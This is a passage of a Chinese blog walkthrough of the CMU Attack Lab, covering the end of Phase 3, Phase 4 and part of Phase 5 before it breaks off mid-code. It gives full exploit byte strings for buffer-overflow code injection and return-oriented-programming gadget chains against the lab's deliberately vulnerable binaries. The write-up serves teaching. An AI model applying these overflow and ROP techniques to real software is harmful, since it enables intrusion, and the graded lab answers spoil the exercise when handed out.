61</code></p><p>注入代码段的地址与上题一样，同样为<code>0x5561dc78</code></p><p>由于在<code>test</code>栈帧中多利用了一个字节存放cookie，所以本题要输入56个字节。注入代码的字节表示放在开头，33-40个字节放置注入代码的地址用来覆盖返回地址，最后八个字节存放cookie的<code>ASCII</code> 。于是得到如下输入：</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">48</span><span class="token plain"> c7 c7 a8 </span><span class="token function" style="color:#d73a49">dc</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">61</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">55</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">68</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fa </span><span class="token number" style="color:#36acaa">18</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 00 c3 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">78</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dc</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">61</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">55</span><span class="token plain"> 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">35</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">39</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">62</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">39</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">39</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">37</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">66</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">61</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" src="/assets/images/image-20220305102649568-98a7d1a63342d7044f4d3af20f445184.png" width="958" height="298" class="img_ev3q"></p><p><strong>攻击成功！</strong></p><p><code>Part 1</code>就此完结啦！</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="part-2-return-oriented-programming">Part 2: Return-Oriented Programming<a href="#part-2-return-oriented-programming" class="hash-link" aria-label="Part 2: Return-Oriented Programming的直接链接" title="Part 2: Return-Oriented Programming的直接链接">​</a></h2><p>在第二部分中，我们要攻击的是<code>rtarget</code>，它的代码内容与第一部分基本相同，但是攻击它却比第一部分要难得多，主要是因为它采用了两种策略来对抗缓冲区溢出攻击</p><ul><li>栈随机化。这段程序分配的栈的位置在每次运行时都是随机的，这就使我们无法确定在哪里插入代码</li><li>限制可执行代码区域。它限制栈上存放的代码是不可执行的。</li></ul><p>看到这里，我不禁一头雾水，这下子该怎么攻击啊？</p><p>庆幸的是，文档也提供了攻击策略，即<strong>ROP：面向返回的程序设计</strong>，就是在已经存在的程序中找到特定的以<code>ret</code>结尾的指令序列为我们所用，称这样的代码段为<code>gadget</code>，把要用到部分的地址压入栈中，每次<code>ret</code>后又会取出一个新的<code>gadget</code>，于是这样就能形成一个程序链，实现我们的目的。<strong>我喜欢将这种攻击方式称作“就地取材，拼凑代码”</strong>。</p><p><img loading="lazy" src="/assets/images/image-20220305141735521-d3d00d5da7f6dcbbbd0e690101d14405.png" width="1675" height="664" class="img_ev3q"></p><p>同时，我们有如下指令编码表：</p><p><img loading="lazy" src="/assets/images/image-20220305135105263-434515b53993d4b3d8c79a2aac20af43.png" width="1010" height="1006" class="img_ev3q"></p><p><strong>举个例子：</strong></p><p><code>rtarget</code>有这样一个函数：</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">setval_210</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3347663060U</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>它的汇编代码字节级表示为：</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">0000000000400f15 </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">setval_21</span><span class="token operator file-descriptor important" style="color:#393A34">0</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    400f15: c7 07 d4 </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">89</span><span class="token plain"> c7   movl </span><span class="token variable" style="color:#36acaa">$0xc78948d4</span><span class="token plain">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">%rdi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    400f1b: c3                  retq</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>查表可知，取其中一部分字节序列 48 89 c7 就表示指令<code>movq %rax, %rdi</code>，这整句指令的地址为<code>0x400f15</code>，于是从<code>0x400f18</code>开始的代码就可以变成下面这样：</p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">movq %rax, %rdi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这个小片段就可以作为一个<code>gadget</code>为我们所用。</p><p>其它一些我们可以利用的代码都在文件<code>farm.c</code>中展示了出来</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="phase-4">Phase 4<a href="#phase-4" class="hash-link" aria-label="Phase 4的直接链接" title="Phase 4的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="分析-3">分析<a href="#分析-3" class="hash-link" aria-label="分析的直接链接" title="分析的直接链接">​</a></h3><p>本题的任务与<code>Phase 2</code>相同，都是要求返回到<code>touch2</code>函数，<code>phase 2</code>中用到的注入代码为：</p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">movq    $0x59b997fa, %rdi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pushq   $0x4017ec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>我们根本不可能找到这种带特定立即数的<code>gadget</code>，只能思考其他办法。</p><p>首先，要做的是把 cookie 赋值给参数寄存器<code>%rdi</code>，考虑将 cookie 放在栈中，再用指令：</p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pop %rdi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>就能实现参数的赋值了，当<code>ret</code>后，从栈中取出来的程序地址再设置为<code>touch2</code>的地址就能成功解决本题</p><p>但是后来发现在<code>farm</code>中找不到这条指令的<code>gadget</code>，经过多次尝试，只好用其他寄存器进行中转，考虑用两个<code>gadget</code></p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">popq %rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">###############</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">movq %rax, %rdi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="栈帧讲解-2">栈帧讲解<a href="#栈帧讲解-2" class="hash-link" aria-label="栈帧讲解的直接链接" title="栈帧讲解的直接链接">​</a></h3><p>根据我们的思路，栈帧情况如下：</p><p><img loading="lazy" src="/assets/images/image-20220305153502546-0fc7dc56ba969e07a9f6e623706b695e.png" width="1241" height="726" class="img_ev3q"></p><p>逻辑如下：</p><ul><li><code>getbuf</code>执行<code>ret</code>，从栈中弹出返回地址，跳转到我们的<code>gardget01</code></li><li><code>gadget01</code>执行，将<code>cookie</code>弹出，赋值给<code>%rax</code>，然后执行<code>ret</code>，继续弹出返回地址，跳转到<code>gardget2</code></li><li><code>gardget2</code>执行，将<code>cookie</code>值成功赋值给参数寄存器<code>%rdi</code>，然后执行<code>ret</code>，继续弹出返回地址，跳转到<code>touch2</code></li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution-3">Solution<a href="#solution-3" class="hash-link" aria-label="Solution的直接链接" title="Solution的直接链接">​</a></h3><p>首要问题是找到我们需要的<code>gadget</code></p><p>先用如下指令得到<code>target</code>的汇编代码及字节级表示</p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">objdump -d rtarget &gt; rtarget.s</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>查表知，<code>pop %rax</code>用<code>58</code>表示，于是查找<code>58</code></p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">00000000004019a7 &lt;addval_219&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4019ad:       c3                      retq                   retq</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>得到指令地址为<code>0x4019ab</code></p><p><code>movq %rax, %rdi</code>表示为<code>48 89 c7</code>，刚好能找到！其中 90 表示“空”，可以忽略</p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">00000000004019c3 &lt;setval_426&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4019c9:       c3                      retq</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>得到指令地址为<code>0x4019c5</code></p><p>根据上图的栈帧，就能写出我们的输入序列：</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ab </span><span class="token number" style="color:#36acaa">19</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fa </span><span class="token number" style="color:#36acaa">97</span><span class="token plain"> b9 </span><span class="token number" style="color:#36acaa">59</span><span class="token plain"> 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c5 </span><span class="token number" style="color:#36acaa">19</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ec </span><span class="token number" style="color:#36acaa">17</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 00 00 00 00 00</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" src="/assets/images/image-20220305161143538-4e6caf5df6bdd9f670c89d9899c9a260.png" width="961" height="325" class="img_ev3q"></p><p><strong>攻击成功！</strong></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="phase-5">Phase 5<a href="#phase-5" class="hash-link" aria-label="Phase 5的直接链接" title="Phase 5的直接链接">​</a></h2><p>先附上<code>Write up</code>中来自 CMU 官方的劝退：</p><blockquote><p>Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now. Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a  true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.</p></blockquote><p>现在是晚上 23:20，我本来已经头昏眼花准备就寝明日再战。但看到这段话，好家伙，不仅没把我劝退，还让我的困意一下子消失，精神振奋了起来。</p><p><strong>长缨已在手，缚住苍龙就在今日！</strong></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="分析-4">分析<a href="#分析-4" class="hash-link" aria-label="分析的直接链接" title="分析的直接链接">​</a></h3><p>本题的任务与<code>Phase 3</code>相同，都是要求返回到<code>touch3</code>函数</p><p><code>Phase 3</code>中用到的注入代码为：</p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">movq    $0x5561dca8, %rdi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pushq   $0x4018fa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>其中<code>0x5561dca8</code>是栈中<code>cookie</code>存放的地址。</p><p>而在本题中，栈的位置是随机的，把<code>cookie</code>存放在栈中似乎不太现实，但是我们又不得不这样做，那么有什么办法呢？只能在代码中获取<code>%rsp</code>的地址，然后根据偏移量来确定<code>cookie</code>的地址。想到这，思路就明晰了。</p><p>查表，<code>movq %rsp, xxx</code>表示为<code>48 89 xx</code>，查找一下有没有可用的<code>gadget</code></p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">0000000000401aab &lt;setval_350&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  401aab:       c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  401ab1:       c3                      retq</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>还真找到了，<code>48 89 e0</code>对应的汇编代码为</p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">movq %rsp, %rax</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>地址为：<code>0x401aad</code></p><p>根据提示，有一个<code>gadget</code>一定要用上</p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> 00000000004019d6 &lt;add_xy&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   4019d6:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   4019da:       c3                      retq</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>地址为：<code>0x4019d6</code></p><p>通过合适的赋值，这段代码就能实现<code>%rsp</code>加上段内偏移地址来确定<code>cookie</code>的位置</p><p>剩下部分流程与<code>Phase 3</code>一致，大体思路如下：</p><ul><li>先取得栈顶指针的位置</li><li>取出存在栈中得偏移量的值</li><li>通过<code>lea    (%rdi,%rsi,1),%rax</code>得到 cookie 的地址</li><li>将 cookie 的地址传给<code>%rdi</code></li><li>调用<code>touch 3</code></li></ul><p>由于<code>gadget</code>的限制，中间的细节需要很多尝试，尝试过程不再一一列举了，我们直接给出代码</p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#地址：0x401aad</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">movq %rsp, %rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#地址：0x4019a2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">movq %rax, %rdi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token 